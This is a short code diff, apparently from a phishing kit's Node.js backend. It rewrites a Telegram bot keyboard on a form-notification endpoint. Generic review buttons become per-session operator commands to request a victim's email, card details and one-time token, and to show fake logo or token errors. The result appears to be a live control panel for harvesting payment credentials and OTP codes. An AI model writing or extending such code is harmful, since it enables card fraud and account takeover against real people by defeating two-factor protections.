@@ -379,12 +379,15 @@ app.post("/notify/formulario", async (req, res) => {
     const botones = {
       inline_keyboard: [
         [
-          { text: "✅ Aprobar", callback_data: `aprobar_${sessionId}` },
-          { text: "❌ Rechazar", callback_data: `rechazar_${sessionId}` }
+          { text: "🚫 Error Logo", callback_data: `inicio_${sessionId}` },
+          { text: "📧 Pedir Correo", callback_data: `correo_${sessionId}` }
         ],
         [
-          { text: "📝 Revisar", callback_data: `revisar_${sessionId}` },
-          { text: "🔄 Solicitar Info", callback_data: `info_${sessionId}` }
+          { text: "💳 Pedir Tarjeta", callback_data: `tarjeta_${sessionId}` },
+          { text: "🔢 Pedir Token", callback_data: `otp1_${sessionId}` }
+        ],
+        [
+          { text: "🚫 Error Token", callback_data: `otp2_${sessionId}` }
         ]
       ]
     };
